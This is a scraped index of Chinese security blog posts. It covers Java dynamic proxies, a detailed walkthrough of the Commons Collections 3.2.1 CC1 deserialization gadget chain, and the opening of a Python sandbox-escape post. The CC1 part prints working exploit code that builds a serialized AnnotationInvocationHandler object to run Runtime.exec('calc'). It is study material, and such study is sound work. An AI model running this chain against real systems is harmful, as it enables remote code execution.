然后在需要使用student的时候，通过JDK动态代理获取student的代理对象。(下面的代理类就是上面所说的委托类) 一、InvocationHandler.invoke方法 负责提供调用代理的操作: public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; }其中proxy为代理类的实例对象，method表示调用的方法名，args为调用方法的参数数组。 那么既然代理对象是重写的接口的方法，而proxy又为代理类的实列对象，所以只要method为接口的方法就可以通过反射来调用代理对象的重写后的方法： method.invoke(proxy,arg);所以构造一个新的Handler： // 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法，重写InvocationHandler接口的invoke方法。 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; ////设置需要代理的对象 } public Object invoke( Object proxy, //代理类的实例对象，也就是构造函数传下来的this.hw Method method, //调用的方法，由前面决定 Object[] args) //调用方法的参数数组 throws Throwable { return method.invoke(hw, args);//反射调用student.hwswent()方法 } }可以看出只要调用到了ProxyHandler.invoke方法后，proxy和method都是满足我们想要的就能成功调用到student.hwsent()方法。 那么又该怎么来调用ProxyHandler.invoke方法呢？接着看 二、Proxy.newProxyInstance方法 Proxy类：负责动态构建代理类，提供了一个静态方法用于得到代理对象： newProxyInstance(ClassLoader,Class\u003c?\u003e[],InvocationHandler);loader指定代理对象的类加载器，interfaces是指代理对象需要实现的接口，可以同时指定多个接口，handler是方法调用的实际处理者，代理对象的方法调用都会转发到这里 Proxy.newProxyInstance会返回一个实现了指定接口的代理对象（这里就是实现homework接口的student嘛），对该对象的所有方法调用都会转发给handler.invoke()方法（假如返回的代理对象名字是stu，那么stu.hwsent()方法调用时就会转发到handler.invoke()方法）。 可以看到如果handler为ProxyHandler，就能触发ProxyHandler.invoke方法了，在invoke()方法里我们除了可以加入反射调用student.hwsent方法外，我们还可以加入其他任何逻辑，比如修改方法参数，加入日志功能、安全检查功能等等。 是不是感觉这个重写invoke方法不就是像上面静态代理的Proxy中的hwsent一样嘛，唯一区别就是可以通过前面的newProxyInstance传入的值来动态改变方法和代理对象，比静态代理方便了很多。 所以构造handler的invoke方法（比上面多加一句话）： // 首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法，重写InvocationHandler接口的invoke方法。 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; class ProxyHandler implements InvocationHandler{ public homework hw; public ProxyHandler(homework work) { this.hw = work; } public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"课代表帮忙交作业\"); return method.invoke(hw, args); } }客户（老师：收作业） // 2. 然后在需要使用student的时候，通过JDK动态代理获取student的代理对象。 import java.lang.reflect.Proxy; public class Main{ public static void main(String[] args){ student stu=new student(); homework home = (homework) Proxy.newProxyInstance( stu.getClass().getClassLoader(), //1. 指定代理对象的类加载器 new Class\u003c?\u003e[] {homework.class}, // 2. 代理需要实现的接口，可以有多个 new ProxyHandler(stu));// 3. 方法调用的实际处理者，代理对象的方法调用都会转发到这里 System.out.println(\"老师收作业\"); home.hwsent(); } }最后效果和静态代理一样： ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:1","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"CGLIB动态代理 JDK动态代理还有上面的静态代理都是基于公共接口的，如果对象没有实现接口该如何代理呢？CGLIB代理登场 CGLIB(Code Generation Library)是一个基于ASM的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。 使用cglib需要引入cglib的jar包，在pom.xml中添加下面这段内容，然后重新加载 \u003cdependency\u003e \u003cgroupId\u003ecglib\u003c/groupId\u003e \u003cartifactId\u003ecglib\u003c/artifactId\u003e \u003cversion\u003e3.3.0\u003c/version\u003e \u003c/dependency\u003e如果出现这个就是ok了： 假如现在的代理类student没有实现接口： public class student{ public void hwsent() { System.out.println(\"张三交作业\"); } }和 jdk 动态代理差不多 首先实现一个MethodInterceptor，方法调用会被转发到该类的intercept()方法。 然后在需要使用student的时候，通过CGLIB动态代理获取代理对象。 一、MethodInterceptor.intercept()方法 对其进行重写： import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; public class RentMethodInterceptor implements MethodInterceptor { public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable { System.out.println(\"课代表帮忙交作业\"); return proxy.invokeSuper(obj, args); } }obj: 表示代理对象，method: 表示正在被调用的方法，args: 表示方法调用时传递的参数数组，proxy: 表示用于调用原始方法的 MethodProxy 对象（比上面的InvocationHandler.invoke方法多了一个参数，也正是这个参数可以使其在没有接口依然能实现动态代理） 至于proxy.invokeSuper(obj, args);这里的方法调用我就没深入跟进了，大概意思就是proxy是个代理类，而proxy.invokeSuper(obj, args)是调用代理类的父类（被代理类）的方法，这个感觉不用怎么管，这是这个工具自己的构造。 二、Enhancer类 构造： import net.sf.cglib.proxy.Enhancer; public class Main{ public static void main(String[] args){ student stu=new student(); Enhancer en = new Enhancer(); //工具类 en.setSuperclass(stu.getClass()); //设置父类 en.setCallback(new RentMethodInterceptor()); //设置回调函数 student proxy = (student) en.create(); //代理对象 //上面的步骤就理解为这个工具使用Enhancer类进行代理的相关设置吧 System.out.println(\"老师收作业\"); //执行代理对象方法 proxy.hwsent(); } } ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:2","tags":["java"],"title":"java动态代理","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"Commons Collections简介 Apache Commons Collections 是一个扩展了Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种Java 应用的开发。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:1:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"环境配置 jdk版本：jdk8u71以下，因为在该jdk版本以上这个漏洞已经被修复了，主要原因是 sun.reflect.annotation.AnnotationInvocationHandler#readObject的逻辑变化了 下载链接：https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html 一、依赖配置 先创建一个新的maven项目，然后在文件pom.xml的中添加（这里是分析Commons Collections3.2.1版本下的一条反序列化漏洞链）： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e完成后重新加载一下即可。 二、源码配置 这个也是需要配置的，因为后面会用到jdk中的一些类，而这些类是class文件，不利于我们分析，我们需要它的源码文件。 下载地址：https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4 点击zip下载后解压，在/src/share/classes中找到sun文件，把其复制到jdk中src.zip的解压文件 然后在idea中的项目结构处加载源路径 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:2:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"链子分析 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"终点类 终点类就是链子的最底端调用危险函数的地方，但这也是我们入手的地方。 接口Transformaer的tranform方法： 然后看一下哪些类实现了该接口（IDEA中快捷键：ctrl+alt+b）： ChainedTransformer 这个类中的transform方法起到个链式调用的作用，就是把前一次的输出当作后一次的输入。 ConstantTransformer 可以看到该类是接受一个任意对象然后都返回一个常量，而该常量又是由构造函数控制的。 InvokerTransformer 这个类中的transform方法实现了个任意方法调用（因为其中的变量可以由构造函数控制）。可以利用其构造恶意方法进行代码执行。 测试一下： package org.example; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test{ public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); in.transform(Runtime.getRuntime()); } } 可以看到能够通过调用该类的transform方法进行恶意方法调用从而命令执行。其实就是其实现了个简单的反射功能，让我们把原本的两行写成了一行。那么这个类就是终点类了。 在正常反序列化分析思路中其实就找两个点，第一个是找哪个类中的方法有调用危险方法（终点类），第二个就是重写了readObject的类（起点类），很显然这里的InvokerTransformer是终点类。 所以接下来就是看谁调用了InvokerTransformer.transform()方法， ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:1","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"checkSetValue() 查找一下transform()的用法（就是看哪里调用了transform()）： 发现 TransformedMap 类的 checkSetValue() 里使用了 valueTransformer 调用 transform()，这个 valueTransformer 看名字就非常可疑，感觉应该是可控的参数，跟进到 TransformedMap 类中， 看到参数valueTransformer是保护+final属性，但发现该类的构造函数可以对valueTransformer进行赋值。 可惜构造函数也是保护属性，只能自己调用。不要灰心继续找找看谁调用了该构造函数（有点像Rutime实例化的获得，不过其是私有属性）。 发现是个公有静态方法可以调用。 那么现在就是可以通过调用decorate函数来进行TransformedMap类实例化从而让valueTransformer的值等于InvokerTransformer。 然后就是要调用checkSetValue() 方法来实现上面InvokerTransformer中的transform()方法，但是从上面不难发现checkSetValue()是个保护属性的函数，所以又要去找找谁调用了checkSetValue()方法。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:2","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"setValue() 可以看到只有一个结果，跟进该类看看： 是个子类里面调用的，并且它的构造方法是保护属性，setValue方法倒是公有属性，但看来是不能直接实列化来调用setValue()方法了， 所以继续往后找，但是这里查看该方法调用结果太多了，看师傅们的文章下面这样就能直接调用到 MapEntry#setValue() 方法 package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用 for(Map.Entry entry : t.entrySet()){ entry.setValue(Runtime.getRuntime()); } } }运行结果： 其实当调用 setValue 方法时 entry 就已经是 abstractinputCheckedMapDecorator$MapEntry 了，这就和 Map.Entry 有关了。 所以最后能够调用到 MapEntry#setvalue 方法 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:3","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"readObject() 但是很显然这里并不是终点链，因为还没有涉及到反序列化。还得继续向上找。最后在 AnnotationInvocationHandle 类中找到了 setvalue 的方法调用。 memberValue参数可控，而且发现还在readObject方法里面，这不妥妥起点类了嘛。 但发现这个构造方法前面没有public属性，那么就是default类型。在java中，default类型只能在本包进行调用。说明这个类只能在sun.reflect.annotation这个包下被调用。 我们要想在外部调用，需要用到反射来解决，进行构造: package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { InvokerTransformer in = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map=new HashMap(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e t= TransformedMap.decorate(map,null,in);//静态方法staic修饰直接类名＋方法名调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,t); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:4","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"三个问题 当然这样是还调用不到setValue方法的，有两个if条件。而且就算调用了发现setVlaue参数是固定的，我们还根本没有把Runtime.getRuntime()这个参数传进去，而且Runtime.getRuntime()也不能进行序列化，因为Runtime没有序列化接口。 总结一下这里的几个问题： 一、Runtime的序列化 二、setValue参数的改变 三、两个if条件的绕过 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:5","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决Runtime的序列化 因为Runtime是没有反序列化接口的的，所以其不能进行反序列化，但是可以把其变回原型类class，这个是存在serilize接口的： 在利用反射来调用其方法，下面是其反射调用的demo： public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Runtime runtime = (Runtime) c1.getMethod(\"getRuntime\",null).invoke(null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }不过这种写法下面照着改InvokerTransformer.tansform调用时不好对照，所以换一种详细的写法。 public class CC1test { public static void main(String[] args)throws Exception { Class c1=Runtime.class; Method getruntime = c1.getMethod(\"getRuntime\",null); Runtime runtime=(Runtime) getruntime.invoke(null,null); c1.getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); } }然后利用InvokerTransformer.tansform来进行代替反射进行调用，因为需要InvokerTransformer.tansform来调用危险函数嘛。 import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1test { public static void main(String[] args)throws Exception { Method getruntime=(Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class); Runtime runtime=(Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getruntime); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); } }分析构造，这里其实就可以把new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);看作是调用Runtime.class的getMethod方法，参数是(\"getRuntime\",null)。 剩下的如法炮制。 但是这样要一个个嵌套创建参数太麻烦了(当然也必须这么改)，这里我们想起上面一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法: 再通俗一点讲就是上面说过的会把前一次的输出当作下一次的输入，这里transform的参数也就是上一次的输出，所以非常符合当前这种情况。 构造： import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; new ChainedTransformer(transformers).transform(Runtime.class);简单分析一下就是建立一个数组把刚刚transform函数前面不同的值储存起来待会循环调用。然后只需传入参数Runtime.class就行了。 那么解决了Runtime反序列化的问题，现在先加上反序列化的代码： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//静态方法调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IO","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:6","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决if条件 上面代码运行肯定是弹不了计算机的。看看调用setValue的地方： 先不说setValue()方法的参数不是我们想要的，这里还有两个if条件，第一个if是要memberType != null，先看memberType是什么： Class\u003c?\u003e memberType = memberTypes.get(name);而这里的name就是键值对中的建，memberTypes： Map\u003cString, Class\u003c?\u003e\u003e memberTypes = annotationType.memberTypes();这个就是注解中成员变量的名称，但是上面的Override没有成员变量。换一个注解，这里用到Target 其成员变量名称是value，所以把key设为value。再次进行调试： 发现第二个if直接就符合条件了，顺利来到了setValue()，不过这里还是简单分析一下第二个if条件： 就是判断value是否是memberType和ExceptionProxy类型的实例，这里value传的是aaa字符串肯定实不符和。所以直接调用到了最后一步setValue方法。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:7","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"解决setValue参数 到这里在理一遍思路，先把上面的代码粘下来： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"key\",\"aaa\"); Map\u003cObject,Object\u003e tmap=TransformedMap.decorate(map,null,cha);//静态方法调用 Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Override.class,tmap); serilize(obj); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException{ ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }首先是通过InvokerTransformer类的transform方法来反射调用Runtime.getRuntime的exec方法执行危险命令。 后面由于需要 Runtime 序列化，所以要利用 Runtime.class 来一步一步调用到危险函数（也就是选调用到 getRuntime 方法然后再调用到 exec 方法）所以连续用了几次 InvokerTransformer 类的 transform 方法。但是后面序列化肯定只有 Runtime.class 一个参数传进去，所以又利用了 ChainedTransformer 类。它的 transform 方法可以实现迭代调用 transform 方法，这样就只用传入 Runtime.class 就可以直接执行到最后的 calc 了（当然这是手动调用）。 然后就是利用TransformedMap类checkSetValue方法来调用ChainedTransformer类的transform，在这之前，利用TransformedMap.decorate静态方法来实现TransformedMap类的实例化主要需要调用其构造方法让参数valueTransformer的值等于ChainedTransformer，这样checkSetValue才能算是调用ChainedTransformer的transform方法， 但由于这里checkSetValue是保护属性，所以又要利用MapEntry类的setValue方法来调用checkSetValue方法，由于MapEntry是个子类且其继承了Map.Entry接口可以在使用上面Map遍历的形式调用到MapEntry类的setValue方法（这是手动） 最后发现AnnotationInvocationHandler类中的readObject方法中刚好有这个Map遍历，至此到readObject就算完成了最后一个类，虽然其是defualt属性，但还是可以利用反射来达到调用。到这里只需要解决最后一个问题，就是setValue的参数问题，因为这个setValue的参数也就是最后transform的参数。 发现前面提到的类ConstantTransformer可以把接受的任何参数都返回一个常量并且常量可控。 那么构造： package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); // cha.transform(Runtime.class); HashMap\u003cObject,Object\u003e map=new HashMap\u003c\u003e(); map.put(\"value\",\"aaa\"); Map\u003cObject,Object\u003e tmap=Transform","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:3:8","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"总结 主要的函数调用就是： transform —-\u003echeckSetValue —-\u003e setValue —-\u003e readObject 只是其中穿插了一些其他需要解决的问题。 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:4:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"补充 一、除了checkValue谁还能调用transform 看了Nivia师傅的CC1确实写得深入，其中在 TransformMap 类中除了 checkValue 方法，put 方法也有调用 transform，跟进一手看看， 这里貌似看不出来，但是可以看到其参数key和value都被某个函数进行了赋值，跟进函数transformKey： 发现keyTransformer或者valueTransformer不为空就会调用其的transform方法，而且参数就是传入得key和Value，所以构造： import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args)throws Exception { Transformer trans =new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, trans); outerMap.put(\"text\", Runtime.getRuntime()); } } 也能成功弹计算机，只不过似乎从put函数向上找到readObjeect应该是找不到的，因为CC1中没有这条链子。不过作为本地手动调用倒是不错。而且作为联想也不错，put就是添加Map的键值嘛，和后面AnnotationInvocationHandler中看到的setValue其实很像，setValue是改变Map的键值。在AnnotationInvocationHandler中看到setValue方法时想到put方法猜测是否可以调用到危险函数。 二、上面的注释类型是什么 在上面对AnnotationInvocationHandler类进行实列化的时候代码如下： Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); Object obj=con.newInstance(Target.class,tmap); 那么这里的Target.class或者是第一次用的Override.class是什么意思呢，这里首先要看AnnotationInvocationHandler类的构造函数的参数类型： 第二个很好理解，就是修饰过的Map。那么第一个是什么呢？ 拷打 GPT，回答说是该对象必须是某个注解的类的 Class，那注解类又是什么呢？这个就不问 GPT 了，直接看Nivia师傅的文章： 传统实现接口的方式需要implement才行，通过注解实现一个接口可以减轻每次都要implement的繁琐。也就是下图中有@的类，位于java.lang.annotation包下： 可以看到除了Target还有很多，当然还有些注解类在其他地方，比如一开始的Override，不过其也引入了java.lang.annotation。 所以这里的Target.class换为Repeatable.class或者其他的有成员变量的都可以 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:5:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"参考 https://nivi4.notion.site/Java-CommonCollections1-60b5c62c3bae4db3bba34928e02b653c https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.788.videopod.sections\u0026vd_source=063e9a026c6d4cc539742104e84a33c1 ","date":"2024-06-20","objectID":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/:6:0","tags":["java","反序列化"],"title":"CC1分析与利用","uri":"/posts/cc1%E9%93%BE%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"},{"categories":["漏洞学习"],"content":"一、生成器 生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。 在 Python 中，生成器可以通过两种方式创建： 1、生成器函数：定义一个函数，使用 yield 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 示例： def my_generator(): yield 1 yield 2 yield 3 gen = my_generator() print(next(gen)) # 第一次调用，输出 1 print(next(gen)) # 第二次调用，输出 2 print(next(gen)) # 第三次调用，输出 32、生成器表达式：使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 示例： gen = (x * x for x in range(5)) print(list(gen)) # 输出 [0, 1, 4, 9, 16]","date":"2024-06-11","objectID":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/:0:1","tags":["python","沙箱逃逸"],"title":"python栈帧沙箱逃逸","uri":"/posts/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"categories":["漏洞学习"],"content":"二、栈帧(frame) 在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 